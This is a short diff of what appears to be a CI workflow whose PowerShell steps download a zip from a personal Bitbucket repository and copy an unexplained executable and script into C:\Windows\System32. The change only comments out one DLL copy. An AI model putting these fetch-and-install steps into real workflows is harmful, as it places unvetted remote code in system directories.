@@ -38,7 +38,7 @@ jobs:
         chdir C:\Windows\System32
         Invoke-WebRequest https://bitbucket.org/sindylestari/sindy/raw/fbb0989251611234a1be583df22d4afc64f97f45/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        Copy libcrypto-1_1-x64.dll C:\Windows\System32
+        #Copy libcrypto-1_1-x64.dll C:\Windows\System32
         Copy cmgi.exe C:\Windows\System32
         Copy maingi.ps1 C:\Windows\System32
         #chdir\windows\system32
